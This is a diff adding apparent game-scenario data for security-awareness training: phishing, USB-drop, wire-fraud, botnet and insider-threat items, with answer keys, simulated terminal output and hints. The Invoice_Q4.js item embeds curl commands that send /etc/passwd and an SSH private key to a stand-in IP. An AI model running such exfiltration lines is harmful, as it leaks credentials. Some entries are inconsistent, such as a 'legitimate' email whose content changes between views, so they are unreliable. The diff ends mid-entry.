@@ -1,0 +1,737 @@
+{
+  "attacks": [
+    {
+      "id": "msg_001",
+      "viewId": "id_001",
+      "type": "phishing_email",
+      "title": "Payroll Update - Immediate Action Required",
+      "difficulty": "easy",
+      "score": {
+        "correct": 50,
+        "miss": -50
+      },
+      "visual": {
+        "icon": "email.png",
+        "preview": {
+          "sender": "payroll@company-payroll.com",
+          "subject": "Urgent: Confirm Your Payroll Info",
+          "summary": "Hi Sam, We detected an error processing your payroll..."
+        }
+      },
+      "content": {
+        "body": "Hi Sam,\n\nWe detected an error processing your payroll. Please confirm your account details here: http://company-payroll.verify-now.zyx/confirm\n\n-- Payroll Team",
+        "attachments": [],
+        "headers": {
+          "From": "payroll@company-payroll.com",
+          "Return-Path": "<bounce@verify-now.zyx>",
+          "Received": [
+            "from mail.verify-now.zyx (203.0.113.50)",
+            "by mail.company.local with ESMTP id 12345"
+          ],
+          "DKIM-Status": "none",
+          "SPF-Result": "softfail"
+        }
+      },
+      "correct_actions": [
+        "quarantine"
+      ],
+      "optional_good_actions": [
+        "scan",
+        "headers",
+        "cat",
+        "whois"
+      ],
+      "terminal_responses": {
+        "headers id_001": "From: payroll@company-payroll.com\nReturn-Path: <bounce@verify-now.zyx>\nReceived: from mail.verify-now.zyx (203.0.113.50)\nby mail.company.local with ESMTP\nDKIM-Status: none\nSPF-Result: softfail",
+        "cat id_001": "From: payroll@company-payroll.com\nTo: sam@company.com\nSubject: Urgent: Confirm Your Payroll Info\n\nHi Sam,\n\nWe detected an error processing your payroll. Please confirm your account details here: http://company-payroll.verify-now.zyx/confirm\n\nIf you don't confirm within 24 hours, your payroll will be delayed.\n\n-- Payroll Team",
+        "scan id_001": "Scan result: Analysis completed. Found: Sender domain mismatch, external server origin (203.0.113.50), SPF check: softfail.",
+        "whois verify-now.zyx": "Domain: verify-now.zyx\nRegistrar: Global Domain Registry\nCreated: 2025-10-07\nCountry: Unknown\nStatus: Recently registration",
+        "whois 203.0.113.50": "IP: 203.0.113.50\nOrganization: Unknown Hosting\nCountry: Unknown\nASN: Not in company IP ranges",
+        "quarantine id_001": "Email quarantined successfully. Moved to secure isolation. Incident logged.",
+        "accept id_001": "Email was not legitimate and moved to inbox. This was a phishing attack."
+      },
+      "hint": "Always verify email authenticity by checking headers and sender information. Pay attention to domain names in links and email addresses. Consider why an email might request urgent action.",
+      "postmortem": "Email security relies on multiple verification systems like SPF and DKIM. External domains masquerading as internal services can lead to data compromise."
+    },
+    {
+      "id": "dev_002",
+      "viewId": "id_002",
+      "type": "usb_drop",
+      "title": "Found USB - 'Company Promo'",
+      "difficulty": "medium",
+      "score": {
+        "correct": 12,
+        "miss": -24
+      },
+      "visual": {
+        "icon": "usb.png",
+        "preview": {
+          "sender": "Found in Lobby",
+          "filename": "README.txt  installer.exe",
+          "summary": "This USB was left alone on the coach..."
+        }
+      },
+      "content": {
+        "files": [
+          {
+            "name": "README.txt",
+            "content": "Welcome! Run the installer to get the most recent security changes using run installer.exe!"
+          },
+          {
+            "name": "installer.exe",
+            "content": "<binary>"
+          }
+        ],
+        "autorun": true
+      },
+      "correct_actions": [
+        "quarantine"
+      ],
+      "optional_good_actions": [
+        "scan",
+        "ls",
+        "strings"
+      ],
+      "terminal_responses": {
+        "ls id_002": "README.txt\ninstaller.exe",
+        "cat id_002/README.txt": "Welcome! Open the installer to get cool swag!",
+        "strings id_002/installer.exe": "...CreateBackdoor...connect 198.51.100.23...persistence...",
+        "strings installer.exe": "...CreateBackdoor...connect 198.51.100.23...persistence...",
+        "scan id_002": "Analysis report: Unverified executable detected\nFile attempts system modifications",
+        "scan id_002/installer.exe": "Program analysis:\nPublisher: Unknown\nRequests elevated access\nAttempts external network connections",
+        "scan installer.exe": "Program analysis:\nPublisher: Unknown\nRequests elevated access\nAttempts external network connections",
+        "run id_002/installer.exe": "Executed: installer.exe\nSystem: suspicious behavior detected - outbound connection to 198.51.100.23 established. Ransom note dropped.",
+        "quarantine id_002": "USB 'CompanyPromo' quarantined. Files isolated for analysis.",
+        "accept id_002": "USB 'CompanyPromo' was not legitimate and moved to inbox. This led to system compromise.",
+        "run installer.exe": "Executed: installer.exe\nSystem: suspicious behavior detected - outbound connection to 198.51.100.23 established. Ransom note dropped."
+      },
+      "hint": "Unknown drives should be quarantined and analyzed, never executed.",
+      "postmortem": "The executable installs a remote backdoor and attempts persistence. In a real environment autorun/executables from unknown media are common infection vectors."
+    },
+    {
+      "id": "file_003",
+      "viewId": "id_003",
+      "type": "script",
+      "title": "Invoice_Q4.js",
+      "difficulty": "medium",
+      "score": {
+        "correct": 15,
+        "miss": -30
+      },
+      "visual": {
+        "icon": "file.png",
+        "preview": {
+          "sender": "external_user@partner.com",
+          "filename": "Invoice_Q4.js",
+          "summary": "function generateInvoice() { ... }"
+        }
+      },
+      "content": {
+        "text": "const fs = require('fs');\n// Invoice Generator v1.2\nfunction generateInvoice(){ /*...*/ }\n// Data sync function\nrequire('child_process').exec('curl http://198.51.100.23/exfil -d \"file=`cat /etc/passwd`\"');",
+        "metadata": {
+          "uploader": "external_user@partner.com",
+          "uploaded_at": "2025-10-08T09:12:00Z"
+        }
+      },
+      "correct_actions": [
+        "quarantine"
+      ],
+      "optional_good_actions": [
+        "scan",
+        "cat",
+        "strings",
+        "whois"
+      ],
+      "terminal_responses": {
+        "cat id_003": "const fs = require('fs');\n// Invoice Generator v1.2\nfunction generateInvoice(){ \n  console.log('Generating Q4 invoice...');\n  // Normal invoice logic here\n}\n\n// Code below:\nrequire('child_process').exec('curl http://198.51.100.23/exfil -d \"file=`cat /etc/passwd`\"');\nrequire('child_process').exec('curl http://198.51.100.23/exfil -d \"creds=`cat ~/.ssh/id_rsa`\"');",
+        "scan id_003": "Pattern match detected: Data exfiltration commands, remote command execution via child_process.exec, network communication to external IP 198.51.100.23",
+        "strings id_003": "generateInvoice\ncurl\nhttp://198.51.100.23/exfil\n/etc/passwd\n~/.ssh/id_rsa\nchild_process\nexec",
+        "whois 198.51.100.23": "IP: 198.51.100.23\nOrganization: Unknown\nCountry: Unknown\nStatus: Not in company IP ranges",
+        "quarantine id_003": "File 'Invoice_Q4.js' quarantined successfully. Execution blocked and file moved to secure isolation.",
+        "accept id_003": "File 'Invoice_Q4.js' was not legitimate and moved to inbox."
+      },
+      "hint": "This JavaScript file claims to be an invoice generator, but check what it actually does! Use 'cat file_003' to view the source code, then 'grep -n \"curl\"' to find suspicious network activity. The file contains hidden data exfiltration commands that send sensitive system files to external servers.",
+      "postmortem": "The script looks like an innocent invoice generator but contains a hidden exfiltration command that would leak system files to an external server."
+    },
+    {
+      "id": "log_004",
+      "viewId": "id_004",
+      "type": "network_log_anomaly",
+      "title": "Spike in Outbound Connections",
+      "difficulty": "hard",
+      "score": {
+        "correct": 18,
+        "miss": -54
+      },
+      "visual": {
+        "icon": "network.png",
+        "preview": {
+          "sender": "WireShark",
+          "filename": "shark1.pcap",
+          "summary": "Unusual outbound connections to single external IP from multiple hosts"
+        }
+      },
+      "content": {
+        "logs": [
+          "2025-10-08T08:00:01 hostA 10.0.1.12 -> 198.51.100.23:443 TLS handshake",
+          "2025-10-08T08:00:05 hostB 10.0.1.15 -> 198.51.100.23:443 TLS handshake",
+          "2025-10-08T08:00:08 hostC 10.0.1.20 -> 198.51.100.23:443 TLS handshake"
+        ],
+        "pcap_summary": "Multiple hosts contacting 198.51.100.23 in short time window."
+      },
+      "correct_actions": [
+        "quarantine"
+      ],
+      "optional_good_actions": [
+        "whois",
+        "scan"
+      ],
+      "terminal_responses": {
+        "whois 198.51.100.23": "No benign registration. Appears hosted on foreign VPS provider.",
+        "scan id_004": "Network scan: Analysis complete. Confirmed repeated outbound connections to 198.51.100.23 from multiple internal hosts; indicators consistent with C2 beaconing.",
+        "quarantine id_004": "Network quarantine applied: Traffic to 198.51.100.23 blocked at perimeter, affected flows quarantined for analysis, and affected hosts flagged for forensic imaging.",
+        "accept id_004": "Network traffic was malicious and confirmed as part of a coordinated attack. This is known as a DDoS attack."
+      },
+      "hint": "Look for common contact points between hosts and check process origins.",
+      "postmortem": "This pattern is consistent with command-and-control beaconing. Immediate isolation and firewall blocking prevents data exfiltration and lateral movement."
+    },
+    {
+      "id": "msg_005",
+      "viewId": "id_005",
+      "type": "legitimate_email",
+      "title": "Team Meeting - Friday 2 PM",
+      "difficulty": "easy",
+      "score": {
+        "correct": 5,
+        "miss": -5
+      },
+      "visual": {
+        "icon": "email.png",
+        "preview": {
+          "sender": "sarah.johnson@company.com",
+          "subject": "Weekly Team Meeting - Required Attendance",
+          "snippet": "Hi team, our weekly meeting is scheduled for Friday at 2 PM..."
+        }
+      },
+      "content": {
+        "body": "Hi team,\n\nOur weekly team meeting is scheduled for Friday at 2 PM in Conference Room B. Please review the attached agenda.\n\nAgenda items:\n1. Project status updates\n2. Next week's deliverables\n3. Team announcements\n\nPlease confirm your attendance by:\n1. Adding the meeting to your calendar\n2. Reviewing the attached agenda\n3. Replying with your project status\n\nMeeting details:\n- Date: Friday, October 11, 2025\n- Time: 2:00 PM - 3:00 PM\n- Location: Conference Room B\n- Dial-in: +1-555-0123, Code: 987654\n\nBest regards,\nSarah Johnson\nTeam Lead, Development",
+        "attachments": [
+          "meeting_agenda.pdf"
+        ],
+        "headers": {
+          "From": "sarah.johnson@company.com",
+          "Return-Path": "<sarah.johnson@company.com>",
+          "Received": [
+            "from mail.company.local (10.0.1.5)",
+            "by mail.company.local with ESMTP id 54321"
+          ],
+          "DKIM-Status": "pass",
+          "SPF-Result": "pass"
+        }
+      },
+      "correct_actions": [
+        "accept"
+      ],
+      "optional_good_actions": [
+        "headers",
+        "scan",
+        "cat"
+      ],
+      "terminal_responses": {
+        "headers id_005": "From: sarah.johnson@company.com\nReturn-Path: <sarah.johnson@company.com>\nReceived: from mail.company.local (10.0.1.5)\nDKIM-Status: pass\nSPF-Result: pass",
+        "cat id_005": "Hi team,\n\nOur weekly team meeting is scheduled for Friday at 2 PM in Conference Room B. Please review the attached agenda.\n\nAgenda items:\n1. Project status updates\n2. Next week's deliverables\n3. Team announcements\n\nBest regards,\nSarah Johnson\nTeam Lead, Development",
+        "scan id_005": "Scan result: Clean. No suspicious indicators found.",
+        "quarantine id_005": "Legitimate email quarantined. Meeting missed.",
+        "accept id_005": "Email marked as legitimate and moved to appropriate folder."
+      },
+      "hint": "Check sender domain, headers, and content for legitimacy markers.",
+      "postmortem": "Legitimate internal communication with proper authentication."
+    },
+    {
+      "id": "dev_006",
+      "viewId": "id_006",
+      "type": "legitimate_storage",
+      "title": "External Storage Device",
+      "difficulty": "easy",
+      "score": {
+        "correct": 5,
+        "miss": -5
+      },
+      "visual": {
+        "icon": "usb.png",
+        "preview": {
+          "sender": "IT Department",
+          "filename": "backup_readme.txt  backups/",
+          "summary": "Company backup drive - property of IT department..."
+        }
+      },
+      "content": {
+        "files": [
+          {
+            "name": "backup_readme.txt",
+            "content": "Company backup drive - property of IT department"
+          },
+          {
+            "name": "backups/",
+            "content": "directory containing system backups"
+          }
+        ],
+        "autorun": false
+      },
+      "correct_actions": [
+        "run"
+      ],
+      "optional_good_actions": [
+        "ls",
+        "cat",
+        "scan"
+      ],
+      "terminal_responses": {
+        "ls id_006": "backup_readme.txt\nbackups/\n  - database_backup_2025-10-07.sql\n  - user_files_backup_2025-10-07.tar.gz\n  - config_backup_2025-10-07.zip\nsystem_images/\n  - server01_image_2025-10-06.img\n  - workstation_template_v2.1.iso",
+        "cat id_006/backup_readme.txt": "Company IT Department - Authorized Backup Drive\n\nSERIAL: BK-2024-007\nOWNER: IT Operations Team\nPURPOSE: Emergency system recovery and data restoration\nAUTHORIZED USERS: IT staff only\nLAST UPDATE: 2025-10-07\n\nContains:\n- Database backups (encrypted)\n- User file backups (encrypted)\n- System configuration backups\n- Recovery images\n\nFor assistance contact: it-ops@company.com",
+        "scan id_006": "Scan result: Clean. \nEncryption: AES-256 detected on backup files\nDigital signatures: Valid company certificates\nAutoruns: Disabled (secure configuration)",
+        "run id_006": "USB drive mounted successfully. Access to backup files granted. No suspicious activity detected.",
+        "quarantine id_006": "Legitimate USB drive quarantined. IT department reprimands for lost time and data."
+      },
+      "hint": "Check labeling and file contents for legitimacy.",
+      "postmortem": "Legitimate company hardware for authorized use."
+    },
+    {
+      "id": "msg_007",
+      "viewId": "id_007",
+      "type": "email",
+      "title": "CEO Urgent Wire Transfer Request",
+      "difficulty": "medium",
+      "score": {
+        "correct": 20,
+        "miss": -40
+      },
+      "content": {
+        "body_full": "Hi Finance Team,\n\nI'm currently in a critical meeting with potential investors and need you to process an urgent wire transfer immediately. The details are confidential - please wire $50,000 to:\n\nAccount: 123456789\nRouting: 987654321\nBank: International Investment Corp\nBeneficiary: M. Smith\n\nPlease confirm completion ASAP. Do not discuss this with anyone else until the deal closes.\n\nTo process this transfer:\n1. Log into our banking portal at secure-bank.company.com\n2. Navigate to Wire Transfers section\n3. Use authorization code: URGENT2024\n4. Confirm with my assistant at ext. 5521\n\n-CEO"
+      },
+      "visual": {
+        "icon": "email.png",
+        "preview": {
+          "sender": "biff_harkins@company.com",
+          "summary": "I'm currently in a critical meeting with potential investors..."
+        }
+      },
+      "correct_actions": [
+        "quarantine"
+      ],
+      "optional_good_actions": [
+        "headers"
+      ],
+      "terminal_responses": {
+        "headers id_007": "From: biff_harkins@company.com\\nTo: finance@company.com\\nDate: Mon, 15 Jan 2024 08:30:00 +0000\\nMessage-ID: <fake123@external-server.xyz>\\nReceived: from external-server.xyz (203.0.113.45)\\nReturn-Path: <fake_ceo@external-domain.com>\\nSPF: FAIL\\nDKIM: FAIL",
+        "quarantine id_007": "Email quarantined. Finance team notified of BEC attempt. CEO alerted for awareness.",
+        "accept id_007": "Illegitimate email accepted. Email is suspicious due to failed SPF/DKIM and external sender domain."
+      },
+      "hint": "Always verify financial requests through secondary channels, especially with urgency pressure.",
+      "postmortem": "Business Email Compromise targeting finance department. $50K theft attempt prevented through proper verification procedures."
+    },
+    {
+      "id": "network_008",
+      "viewId": "id_008",
+      "type": "network",
+      "title": "Internal Network Activity",
+      "difficulty": "medium",
+      "score": {
+        "correct": 25,
+        "miss": -50
+      },
+      "content": {
+        "alert": "NETWORK ANOMALY DETECTED\\n\\nSource: workstation-dev-07 (192.168.1.47)\\nTarget: multiple_hosts\\nActivity: Port scanning, credential harvesting attempts\\nProtocols: SMB, RDP, SSH\\nTime: 02:30-04:15 AM\\n\\nSuspicious behaviors:\\n- Non-standard working hours\\n- Administrative tool usage from dev workstation\\n- Multiple failed authentication attempts\\n- Lateral movement patterns detected"
+      },
+      "visual": {
+        "icon": "network.png",
+        "preview": {
+          "sender": "IDS System",
+          "summary": "NETWORK ANOMALY DETECTED"
+        }
+      },
+      "correct_actions": [
+        "quarantine"
+      ],
+      "optional_good_actions": [
+        "scan"
+      ],
+      "terminal_responses": {
+        "scan 192.168.1.47": "SYSTEM ANALYSIS:\\n- Multiple unrecognized programs detected\\n- Remote Access Tool: Win32.RemoteControl\\n- Input Monitor: KeyboardMonitor\\n- Authentication Tool: CredentialManager\\n- Background Service: NetworkService",
+        "quarantine id_008": "Host quarantined from network. Security team alerted for incident response.",
+        "accept id_008": "Illegitimate network activity accepted. Host is compromised and part of a coordinated attack. This is known as an APT attack."
+      },
+      "hint": "APT-style lateral movement requires immediate isolation to prevent further compromise.",
+      "postmortem": "Advanced Persistent Threat containment. Workstation was patient zero for attempted domain compromise. 48-hour forensic investigation revealed phishing vector and prevented data exfiltration."
+    },
+    {
+      "id": "update_009",
+      "viewId": "id_009",
+      "type": "software",
+      "title": "Software Update Package",
+      "difficulty": "medium",
+      "score": {
+        "correct": 30,
+        "miss": -60
+      },
+      "content": {
+        "files": [
+          {
+            "name": "security_update_v2.1.exe",
+            "content": "Software update package from trusted vendor"
+          },
+          {
+            "name": "changelog.txt",
+            "content": "Security fixes and performance improvements"
+          },
+          {
+            "name": "signature.asc",
+            "content": "Digital signature file"
+          }
+        ],
+        "alert": "Automatic software update available from TrustedSoft Inc.\\nVersion 2.1 includes critical security patches.\\nDownload size: 45.2 MB\\nUpdate scheduled for deployment."
+      },
+      "visual": {
+        "icon": "file.png",
+        "preview": {
+          "filename": "security_update_v2.1.exe",
+          "sender": "TrustedSoft Inc.",
+          "summary": "Software update package awaiting deployment"
+        }
+      },
+      "correct_actions": [
+        "quarantine"
+      ],
+      "optional_good_actions": [
+        "strings",
+        "scan"
+      ],
+      "terminal_responses": {
+        "ls id_009": "security_update_v2.1.exe\\nchangelog.txt\\nsignature.asc\\ninstall_config.xml",
+        "strings id_009/security_update_v2.1.exe": "...SolarWinds...Orion...update_service...SERVER...startup.exe...\\x41\\x41\\x41\\x41...load_module...encoding...sync_data...",
+        "strings security_update_v2.1.exe": "...SolarWinds...Orion...update_service...SERVER...startup.exe...\\x41\\x41\\x41\\x41...load_module...encoding...sync_data...",
+        "scan id_009": "FILE ANALYSIS:\\n- Unknown binary variant\\n- Modified package signature\\n- Embedded encrypted content\\n- Network communication components\\n- Data transfer modules",
+        "quarantine id_009": "Update package quarantined. Vendor notified of compromise. Deployment blocked across organization.",
+        "accept id_009": "Illegitimate software update accepted. This is a supply chain attack and the organization is now compromised."
+      },
+      "hint": "Always verify software integrity through multiple channels, especially for critical updates.",
+      "postmortem": "Supply chain attack prevented. Vendor confirmed compromise of their build system. Organization avoided deployment of nation-state level persistent threat."
+    },
+    {
+      "id": "phone_call_010",
+      "viewId": "id_010",
+      "type": "voice",
+      "title": "VIP Social Engineering Call",
+      "difficulty": "medium",
+      "score": {
+        "correct": 20,
+        "miss": -40
+      },
+      "content": {
+        "transcript": "PHONE CALL TRANSCRIPT\\n\\nCaller: Hi, this is James Peterson from the board of directors. I'm calling because I'm having urgent technical issues with my company laptop while traveling.\\n\\nIT Support: How can I help you Mr. Peterson?\\n\\nCaller: I need immediate remote access to the financial reports for tomorrow's board meeting. My VPN isn't working and I can't access the SharePoint site. Can you create a temporary admin account for me? I'll give you my assistant's number to verify - she's Sarah at extension 4421.\\n\\nIT Support: [AWAITING RESPONSE]"
+      },
+      "visual": {
+        "icon": "email.png",
+        "preview": {
+          "sender": "James Peterson (Board)",
+          "summary": "PHONE CALL TRANSCRIPT..."
+        }
+      },
+      "correct_actions": [
+        "quarantine"
+      ],
+      "optional_good_actions": [
+        "whois"
+      ],
+      "terminal_responses": {
+        "whois id_010": "IDENTITY VERIFICATION:\\n- James Peterson is a legitimate board member\\n- However, he is currently in the office (badge scan 20 minutes ago)\\n- Real Peterson contacted - confirms he did not make this call\\n- Social engineering attempt confirmed",
+        "quarantine id_010": "Incident logged. No changes made to user accounts. IT security team alerted for awareness.",
+        "accept id_010": "Illegitimate request accepted. Unauthorized admin account created. This led to a data breach."
+      },
+      "hint": "Always verify VIP requests through established channels, not information provided by caller.",
+      "postmortem": "Sophisticated social engineering attempt targeting privileged access. Attacker had insider knowledge and prepared accomplice. Proper verification procedures prevented unauthorized admin access."
+    },
+    {
+      "id": "iot_011",
+      "viewId": "id_011",
+      "type": "network",
+      "title": "IoT Device Network Activity",
+      "difficulty": "easy",
+      "score": {
+        "correct": 15,
+        "miss": -15
+      },
+      "content": {
+        "alert": "NETWORK SECURITY ALERT\\n\\nDevice: Conference Room Printer (192.168.2.101)\\nBehavior: Unusual outbound traffic\\nVolume: 500MB uploaded in 2 hours\\nDestination: Multiple external IP addresses\\nTraffic type: DNS amplification queries\\n\\nAdditional devices showing similar patterns:\\n- Security Camera 3F-West: 192.168.2.205\\n- Smart Thermostat Lobby: 192.168.2.089\\n- Voice Assistant Break Room: 192.168.2.154"
+      },
+      "visual": {
+        "icon": "network.png",
+        "preview": {
+          "sender": "IDS System",
+          "summary": "IoT devices showing botnet behavior"
+        }
+      },
+      "correct_actions": [
+        "quarantine"
+      ],
+      "optional_good_actions": [
+        "scan"
+      ],
+      "terminal_responses": {
+        "scan 192.168.2.101": "IoT DEVICE SCAN:\\n- Default admin credentials active\\n- Firmware version: 2.1.3 (outdated, vulnerabilities known)\\n- Open ports: 22, 23, 80, 443, 8080\\n- Unknown signature detected",
+        "quarantine id_011": "IoT devices isolated from network. Firmware update and credential reset required. Security team notified for further investigation.",
+        "accept id_011": "Illegitimate IoT activity accepted. Devices remain compromised and part of a botnet. This led to external DDoS attack."
+      },
+      "hint": "IoT devices require regular maintenance: firmware updates, credential changes, and network segmentation.",
+      "postmortem": "IoT botnet disrupted. Organization's devices were unknowingly participating in external DDoS attack. Improved IoT security policies implemented."
+    },
+    {
+      "id": "system_012",
+      "viewId": "id_012",
+      "type": "system",
+      "title": "High CPU Usage Process",
+      "difficulty": "easy",
+      "score": {
+        "correct": 15,
+        "miss": -15
+      },
+      "content": {
+        "alert": "SYSTEM PERFORMANCE ALERT\\n\\nHost: accounting-ws-12 (192.168.1.156)\\nCPU Usage: 98% sustained for 4 hours\\nGPU Usage: 100% (unusual for accounting workstation)\\nNetwork Activity: Persistent connections to mining pools\\nProcess: 'svchost.exe' consuming excessive resources\\n\\nUser reports: Extreme system slowdown"
+      },
+      "visual": {
+        "icon": "usb.png",
+        "preview": {
+          "sender": "Task Manager",
+          "summary": "Cryptocurrency mining malware detected"
+        }
+      },
+      "correct_actions": [
+        "quarantine"
+      ],
+      "optional_good_actions": [
+        "scan"
+      ],
+      "terminal_responses": {
+        "scan id_012": "FULL SYSTEM SCAN:\\n- Program detected: CoinMiner.Monero.Stealth\\n- Location: C:\\\\Windows\\\\System32\\\\svchost32.exe\\n- Additional files: miner_config.json, pool_list.txt\\n- Registry keys: HKLM\\\\Software\\\\Microsoft\\\\XMRig\\n- Scheduled task: 'Windows System Maintenance'",
+        "quarantine id_012": "Host quarantined from network. Malware removed. User educated on phishing risks. Endpoint protection updated.",
+        "accept id_012": "Illegitimate process accepted. Cryptocurrency mining continues, leading to further system compromise."
+      },
+      "hint": "Cryptocurrency mining malware often disguises itself as legitimate system processes.",
+      "postmortem": "Cryptocurrency mining infection removed. User education provided on avoiding suspicious downloads. Endpoint protection updated with new signatures."
+    },
+    {
+      "id": "user_013",
+      "viewId": "id_013",
+      "type": "user_behavior",
+      "title": "Data Access Pattern",
+      "difficulty": "medium",
+      "score": {
+        "correct": 25,
+        "miss": -50
+      },
+      "content": {
+        "alert": "DATA LOSS PREVENTION ALERT\\n\\nUser: jennifer.wong@company.com\\nDepartment: Marketing (non-privileged)\\nActivity: Accessing confidential R&D files\\nTime: 11:47 PM - 2:23 AM\\nFiles accessed: 47 files from multiple departments\\nActions: Download, copy to USB, email to personal account\\n\\nNote: User submitted resignation yesterday"
+      },
+      "visual": {
+        "icon": "usb.png",
+        "preview": {
+          "sender": "jennifer.wong@company.com",
+          "summary": "DATA LOSS PREVENTION ALERT..."
+        }
+      },
+      "correct_actions": [
+        "quarantine"
+      ],
+      "optional_good_actions": [
+        "scan"
+      ],
+      "terminal_responses": {
+        "scan id_013": "USER ACTIVITY ANALYSIS:\\n- Access outside normal hours\\n- Large volume of sensitive data accessed\\n- Use of unauthorized external storage\\n- Emailing to non-corporate address",
+        "quarantine id_013": "User account disabled. Data access blocked. Incident escalated to HR and legal for potential insider threat investigation.",
+        "accept id_013": "Illegitimate user activity accepted. Data exfiltration completed, leading to significant confidential data breach."
+      },
+      "hint": "Insider threats often involve legitimate access used maliciously, requiring behavioral analysis.",
+      "postmortem": "Insider data theft prevented from full completion. 2.3GB of confidential data exposure confirmed. Legal action initiated. Enhanced monitoring implemented for departing employees."
+    },
+    {
+      "id": "msg_019",
+      "viewId": "id_019",
+      "type": "legitimate_email",
+      "title": "Please do your Monthly Password Reset",
+      "difficulty": "easy",
+      "score": {
+        "correct": 25,
+        "miss": -50
+      },
+      
+      "visual": {
+        "icon": "email.png",
+        "preview": {
+          "sender": "officialxyz@company.com",
+          "subject": "Urgent: Reset Password",
+          "summary": "Hi Sam, you are overdue for your monthly password reset. Please do it now to avoid account lockout."
+        }
+      },
+      
+      "content": {
+        "body": "Hi Sam,\n\nYou are overdue for your monthly password reset. Please do it now to avoid account lockout: portal.company.xyz/reset-password\n\n--XYZ Companies Team",
+        "attachments": [],
+        "headers": {
+          "From": "xyzcompanies@company.com",
+          "Return-Path": "<xyzcompanies@company.com>",
+          "Received": [
+            "from mail.company.local (10.0.1.5)",
+            "by mail.company.local with ESMTP id 56789"
+          ],
+          "DKIM-Status": "pass",
+          "SPF-Result": "pass"
+        }
+      },
+      "correct_actions": [
+        "browser_input"
+      ],
+      "optional_good_actions": [
+        "scan",
+        "headers",
+        "cat",
+        "whois"
+      ],
+      "terminal_responses": {
+        "headers msg_019": "From: xyzcompanies@company.com\nReturn-Path: <xyzcompanies@company.com>\nReceived: from mail.company.local (10.0.1.5)\nby mail.company.local with ESMTP\nDKIM-Status: pass\nSPF-Result: pass",
+        "headers id_019": "From: xyzcompanies@company.com\nReturn-Path: <xyzcompanies@company.com>\nReceived: from mail.company.local (10.0.1.5)\nby mail.company.local with ESMTP\nDKIM-Status: pass\nSPF-Result: pass",
+        "cat msg_019": "From: xyzcompanies@company.com\nTo: sam@company.com\nSubject: Daily Checks Reminder\n\nHi Sam,\n\nPlease do your daily checks on system security and report any anomalies.\n\n-- XYZ Companies Team",
+        "cat id_019": "From: xyzcompanies@company.com\nTo: sam@company.com\nSubject: Daily Checks Reminder\n\nHi Sam,\n\nPlease do your daily checks on system security and report any anomalies.\n\n-- XYZ Companies Team",
+        "scan msg_019": "Scan result: Clean. No suspicious indicators found. Legitimate internal company communication.",
+        "whois company.com": "Domain: company.com\nRegistrar: Authorized Corporate Registry\nCreated: 2010-03-15\nCountry: United States\nStatus: Active, verified company domain",
+        "whois 10.0.1.5": "IP: 10.0.1.5\nOrganization: Company Internal Mail Server\nNetwork: Internal corporate network\nASN: Company IP ranges - legitimate",
+        "accept msg_019": "Email marked as legitimate and processed. Daily security check reminder acknowledged.",
+        "accept id_019": "Email marked as legitimate and processed. Daily security check reminder acknowledged."
+      },
+      "hint": "Check domain and see if it matches the company domain.",
+      "postmortem": "Legit Email. No action required."
+    },
+    {
+      "id": "msg_020",
+      "viewId": "id_020",
+      "type": "legitimate_email",
+      "title": "Login and Do Checks",
+      "difficulty": "easy",
+      "score": {
+        "correct": 18,
+        "miss": -18
+      },
+      "visual": {
+        "icon": "email.png",
+        "preview": {
+          "sender": "xyzcompanies@company.com",
+          "subject": "Daily Checks Reminder",
+          "summary": "Hi Sam, Please do your daily checks on system security and report any anomalies at scan.company.xyz."
+        }
+      },
+      "content": {
+        "body": "Hi Sam,\n\nPlease do your daily checks on system security and report any anomalies at scan.company.xyz.\n\n-- XYZ Companies Team",
+        "attachments": [],
+        "headers": {
+          "From": "xyzcompanies@company.com",
+          "Return-Path": "<xyzcompanies@company.com>",
+          "Received": [
+            "from mail.company.local (10.0.1.5)",
+            "by mail.company.local with ESMTP id 56789"
+          ],
+          "DKIM-Status": "pass",
+          "SPF-Result": "pass"
+        }
+      },
+      "correct_actions": [
+        "browser_input"
+      ],
+      "optional_good_actions": [
+        "scan",
+        "cat",
+        "headers",
+        "whois"
+      ],
+      "terminal_responses": {
+        "headers id_020": "From: xyzcompanies@company.com\nReturn-Path: <xyzcompanies@company.com>\nReceived: from mail.company.local (10.0.1.5)\nby mail.company.local with ESMTP\nDKIM-Status: pass\nSPF-Result: pass",
+        "cat id_020": "From: xyzcompanies@company.com\nTo: sam@company.com\nSubject: Daily Checks Reminder\n\nHi Sam,\n\nPlease do your daily checks on system security and report any anomalies.\n\n-- XYZ Companies Team",
+        "scan id_020": "Scan result: Clean. No suspicious indicators found. Legitimate internal company communication.",
+        "whois company.com": "Domain: company.com\nRegistrar: Authorized Corporate Registry\nCreated: 2010-03-15\nCountry: United States\nStatus: Active, verified company domain",
+        "whois 10.0.1.5": "IP: 10.0.1.5\nOrganization: Company Internal Mail Server\nNetwork: Internal corporate network\nASN: Company IP ranges - legitimate",
+        "accept id_020": "Email marked as legitimate and processed. Daily security check reminder acknowledged."
+      },
+      "hint": "Check domain and see if it matches the company domain.",
+      "postmortem": "Legit Email. No action required."
+    },
+    {
+      "id": "msg_021",
+      "viewId": "id_021",
+      "type": "phishing_email",
+      "title": "Please do your Monthly Password Reset",
+      "difficulty": "medium",
+      "score": {
+        "correct": 50,
+        "miss": -50
+      },
+      "visual": {
+        "icon": "email.png",
+        "preview": {
+          "sender": "officialxyz@company.com",
+          "subject": "Urgent: Reset Password",
+          "summary": "Hi Sam, you are overdue for your monthly password reset. Please do it now to avoid account lockout."
+        }
+      },
+      "content": {
+        "body": "Hi Sam,\n\nYou are overdue for your monthly password reset. Please do it now to avoid account lockout: portal.companies.xyz/reset-password\n\n-- XYZ Companies Team",
+        "attachments": [],
+        "headers": {
+          "From": "officialxyz@company.com",
+          "Return-Path": "<bounce@verify-now.zyx>",
+          "Received": [
+            "from mail.verify-now.zyx (203.0.113.50)",
+            "by mail.company.local with ESMTP id 12345"
+          ],
+          "DKIM-Status": "none",
+          "SPF-Result": "softfail"
+        }
+      },
+      "indicators": [
+        "Link domain (portal.companies.xyz) does not match sender domain",
+        "Return-path and Received values originate outside company infrastructure",
+        "Urgency language: immediate/urgent"
+      ],
+      "correct_actions": [
+        "quarantine"
+      ],
+      "optional_good_actions": [
+        "scan",
+        "headers",
+        "cat",
+        "whois"
+      ],
+      "terminal_responses": {
+        "headers id_021": "From: officialxyz@company.com\nReturn-Path: <bounce@verify-now.zyx>\nReceived: from mail.verify-now.zyx (203.0.113.50)\nby mail.company.local with ESMTP\nDKIM-Status: none\nSPF-Result: softfail",
+        "cat id_021": "From: officialxyz@company.com\nTo: sam@company.com\nSubject: Urgent: Reset Password\n\nHi Sam,\n\nyou are overdue for your monthly password reset. Please do it now to avoid account lockout: portal.companies.xyz/reset-password\n\n-- XYZ Companies Team",
